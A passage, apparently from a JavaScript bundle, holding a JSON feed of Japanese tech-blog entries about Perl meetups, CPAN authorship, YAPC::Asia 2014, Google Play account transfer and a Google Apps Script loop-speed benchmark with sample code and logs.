おーさーとやらになったようです。CPANにあったので自分でモジュールを書く機会がなかなかなかったのですが、都合よく必要となってかつ誰も書いてなさそうという機会に今回恵まれました。Acmeモジュールはいくつか書いていたけど、それでCPAN Authorになるのはちょっと厭だと思って居た。初uploadなので粗があったらツッコミがあると幸いです。","link":"https://blog.masasuzu.net/entry/2014/12/26/183818","isoDate":"2014-12-26T09:38:18.000Z","dateMiliSeconds":1419586698000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#kichijojipm 吉祥寺.pm #1 に行ってきました (だいぶ昔の話","contentSnippet":"吉祥寺.pm (kichijojipm) #1 : ATND吉祥寺とは縁もゆかりもないのですが、pmが近めの場所でやっているということで、お邪魔してきました。懇親会は結局2次会、3次会まで行ってオールになってしましました。perlの事情をいろいろ聞けて楽しかったです。吉祥寺良いところでしたので、次回あれば参加したいです。","link":"https://blog.masasuzu.net/entry/2014/11/15/001845","isoDate":"2014-11-14T15:18:45.000Z","dateMiliSeconds":1415978325000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#perlcasual PerlCasual #06 行ってきた(だいぶ昔の話","contentSnippet":"perlcasual #06行ってきました。PerlCasual #06 : ATNDだいぶ昔の話です。hogecasualと名のつく勉強会はだいたいカジュアルじゃ無いんですが(感覚値)、今回はだいぶカジュアルな感じだったと思います。perlのコマンドラインtipsがとてもよかったです。基礎的な部分でも意外にに知らない部分が多くて勉強なりました。懇親会ではperlの会話をあまりしてなかった気がしました。カジュアルですね。さて、カジュアル。perlをばりばりやっている人にとってカジュアルなのか。perl初心者にとってカジュアルなのか。他言語の人に対してカジュアルなのか。いろいろあると思います。その辺のターゲットは主催者のさじ加減だと思います。ところで、pelrcasualはperlをカジュアルに楽しむ初心者向け となってます。ただ、内容としてはカジュアルだとは思いますが、本当の初心者にはついてこれるのかなという感じはしました。本当に本当の初心者はperl入学式が引受先なのかなという感じがします。なんとなくカジュアルの意味するところは(初)中級者くらいのレベル感なのかなと。そう考えると(Perl Beginnersは参加したことが無いので本当のレベル感が分からないのですが)、Perl初学者が以下のようにステップアップしていけるとperlの裾野が広がっていっていいのかなーとか思いました。主催者はそんな意図では無いかもですが。Perl入学式 => (Perl Beginners) => PerlCasualって、なんか本題と関係ない方向に行ってしまった。","link":"https://blog.masasuzu.net/entry/2014/11/14/000000","isoDate":"2014-11-13T15:00:00.000Z","dateMiliSeconds":1415890800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#chibapm Chiba.pm #5 でログ回りのことを聞きたかった","contentSnippet":"だいぶ昔の話ですが、chiba.pm #5でこんなLTしてきました。Chiba.pm #5 : ATND今の会社ではこんな感じでログ収集していて、こんなログ監視してるけど、他のところではどんなことしてるの?的な発表でした。現状は各webサーバのアクセスログをfluentdで収集して、ログサーバでファイルに吐かれたログを解析して、vhost,path,status(401,404,500)毎に閾値が以上のアクセスが来ているモノに関してアラートを上げるようにしてます。スクリプトでログ解析していたものが、Aggregationsでだいぶ楽に出来そうな目処が出来てる感じです。この辺別の機会にエントリ書きたいです。ともあれ、このくらいの規模の勉強会が個人的には楽しいです。次回も参加したいです。","link":"https://blog.masasuzu.net/entry/2014/10/27/chiba.pm_5","isoDate":"2014-10-27T10:49:56.000Z","dateMiliSeconds":1414406996000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"YAPC::Asia 2014 1 日目の感想","contentSnippet":"謝辞まず初めに YAPC::Asia 2014 に参加させていただきましてありがとうございました。また、このイベントに関わった運営スタッフ個人・企業スポンサースピーカー会場をお貸しいただきました慶応義塾大学 日吉キャンパスの皆様に厚く御礼申し上げます。初めて YAPC に参加して思ったこと近年は言語の壁を超えてたくさんのエンジニアが集まる YAPC、その噂以上に熱気と勢いに翻弄されっぱなしでした。あとはインターネットではよくお見かけするエンジニアの方も実物がわからずにお名前を伺って初めて「あぁ、あの方か！！」となることがあって失礼な場面も少なからずあったなという反省はありました。よかったところたくさんの運営スタッフの方のおかげで存分に YAPC を楽しめたところ。あとはスポンサー様による無限コーヒーや懇親会、HUB のビール 1,000 杯提供など、人が集まる仕掛けがたくさんあったこと。人の温かみを感じるイベントは意外と少ないと私は思っているので、感謝の限りでしたし、エンジニアから愛されている意味がとてもよく伝わってきました。気になったところセッションによっては人が集中してしまって多目的教室のキャパシティを超えてしまっていたので落ち着いて聞くことができなかったのは少し残念でした。セッションについてお世辞抜きにどのセッションも見応えがあって大満足でした。普段聞くことのないエンジニアの想いや考え方、実例から伺える努力や苦悩の裏側など、人とエンジニアリングの関わりみたいなところに特に面白さを感じました。スピリチュアルな話とかけっこう好きなので、そっちよりのセッションを割と聞いてました。YAPC を通じて感じたこと人とのつながりは自身を成長させてくれる人が成長する上で、たくさんのことを知る、というのはとても重要なものだと思います。中でもその人が経験してきた体験談というのは情報として価値のあるものであるし、そんな体験談を聞くことができる機会というのは自分も周りも一緒に成長していくことができる貴重な時間であるということ。せっかくの貴重な機会を無駄にしない普段知り合う機会のないインターネット上の有名な方々にお会いするまたとないチャンス。それにたくさんの人と話す機会自体もそんなにないので積極的に絡むべきだし、そういった意味で懇親会は非常によかったです。モチベーションがあがるやはり周りからの刺激は自身の気持ちを高ぶらせてくれます。人によって差はあると思いますが、モチベーションを１人で維持・向上させるというのは難しいので、YAPC のような規模の大きいお祭りに参加するというのはエンジニアとして必要なことであると捉えてます。最後に今回は一般チケットでの参加でしたが、4,000 円でありあまるほどの価値があったと思っています。次回は是非とも個人スポンサーとして参加させていただければと思います。こうやってエンジニアが集まるお祭りもそうはないので、いちエンジニアとして YAPC を大切にしていければと思います。あとは諸事情により 2 日目に参加できなかったので来年こそは全日程に参加したいですね！！","link":"https://blog.jigyakkuma.org/2014/08/31/yapc-asia2014/","isoDate":"2014-08-31T00:00:00.000Z","dateMiliSeconds":1409443200000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"GooglePlay Developer のアカウント移行時にハマったのでメモ","contentSnippet":"先日、iOS と Android のアプリを別のアカウントに移行する作業をしてました。Android はどうかというと、アプリ移行申請ページなるものから申請を行い、GooglePlay Developer Support の方々がせっせと設定を変更してくれるみたいです。今回申請するにあたり、うまくいかず時間を要してしまったのでメモ程度に残しておきたいと思います。Android アプリ移行の簡単な流れAndroid アプリの申請ページに辿り着くGooglePlay developer アカウントの準備 プライベートチャンネルのアプリ収益化されたアプリApplication Transfer RequestDeveloper Account Registration の意味を盛大に履き違えるここでズッポリはまってしまった。Application Transfer Request で「Developer Account Registration」と書いてあり、私は GooglePlay developer や GoogleWallet からそれらしいコードを探したが見つからない。Click the Developer Registration order (This may be titled “ Google - Google Play ”)  が、GooglePlay developer 開設時に支払った登録料であることに気づく。というかちゃんと読んで理解してればすぐに気づくはず。いつもの文章をしっかり読まない性格が招いたトラブルだったなーと反省しました…が、まさか GooglePlay developer 開設時の登録料の登録 ID とは思いもよりませんでしたね…","link":"https://blog.jigyakkuma.org/2013/11/02/gpd-account/","isoDate":"2013-11-02T00:00:00.000Z","dateMiliSeconds":1383350400000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"GAS の処理速度が遅いと評判なので計測してみた","contentSnippet":"先日、GAS でいつものようにコードを組んでいたのですが、どうも処理が追いつかずサーバ側のタイムアウトが発生する事案に遭遇。以下の記事にもあるように、GAS は API をコールしまくると途端に処理速度が低下するのはよくある話で、今回のコードも何の考えもなしにループの終了条件で getLastRow()を設定していた。[GAS][スプレッドシート]処理速>    度を向上するには: 逆引き Google Apps Scriptいつもならバグ見つかってよかったー、で終わってしまうのですがちょっと気になることがあったので検証してみました。【検証】 GAS の処理が遅いって言われてるけど、実際どうなの？ということで今回はよくやりそうな処理のサンプルを作ってみたので実測値を見てみる。[検証 1]for 文に getLastRow()を突っ込んだ場合の処理遅延以下のコードを実行してみる。\\tfunction speedCheck1() {\\t  var ss = SpreadsheetApp.openById(SS_KEY).getActiveSheet();  \\t  var counter = ss.getLastRow();   \\t Logger.log(\'speed check start:getLastRow()\'); \\t for(var i = 0;i < ss.getLastRow();i++){} \\t Logger.log(\'speed check end:getLastRow()->count:\'+i);\\t  Logger.log(\'speed check start:counter\'); \\t for(var i = 0;i < counter;i++){}\\t  Logger.log(\'speed check end:counter->count:\'+i);\\t}\\t結果は以下。\\t[13-10-24 00:31:46:496 JST] speed check start:getLastRow()\\t[13-10-24 00:31:54:044 JST] speed check end:getLastRow()->count:100\\t[13-10-24 00:31:54:045 JST] speed check start:counter\\t[13-10-24 00:31:54:045 JST] speed check end:counter->count:100[検証 2]ループ内でスプレッドシートの値を getValue()しちゃった場合の処理遅延次はこちらのコード。\\tfunction speedCheck2() {\\t  var ss = SpreadsheetApp.openById(SS_KEY).getActiveSheet();\\t  var array = ss.getDataRange().getValues();\\t  var counter = ss.getLastRow();\\t  var result = new Array();  \\t  Logger.log(\'speed check start:getValue()\');\\t  for(var i = 0;i < counter;i++){ \\t   result[i] = ss.getRange(i+1,1).getValue();\\t  } \\t  Logger.log(\'speed check end:getValue()->count:\'+i); \\t  Logger.log(\'speed check start:assignment\'); \\t  for(var i = 0;i < counter;i++){\\t    result[i] = array[i][0]; \\t  } \\t  Logger.log(\'speed check end:assignment->count:\'+i);\\t}結果結果はご覧の通り。\\t[13-10-24 00:36:15:285 JST] speed check start:getLastRow()\\t[13-10-24 00:36:22:977 JST] speed check end:getLastRow()->count:100\\t[13-10-24 00:36:22:977 JST] speed check start:counter\\t[13-10-24 00:36:22:978 JST] speed check end:counter->count:100整理すると[検証 1] 7452ms  [検証 2] 7692ms  という結果でした。メソッドによって 1call 当たりの処理速度は当然ながら変わってくると思いますので参考程度に見てもらえればと思います。しかしながら 100 回 call しただけで 7 秒以上の差が出ているのは驚きなので、複雑な処理になっている時ほど処理を改善すると効果絶大です。処理速度にお悩みでしたらコード内にこういった処理が潜んでいるかもしれません。","link":"https://blog.jigyakkuma.org/2013/10/22/gas-speed/","isoDate":"2013-10-22T00:00:00.000Z","dateMiliSeconds":1382400000000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"Links","contentSnippet":"","link":"https://blog.jigyakkuma.org/links/","isoDate":"2001-01-01T00:00:00.000Z","dateMiliSeconds":978307200000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"Search","contentSnippet":"","link":"https://blog.jigyakkuma.org/search/","isoDate":"2001-01-01T00:00:00.000Z","dateMiliSeconds":978307200000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"}]')}}]);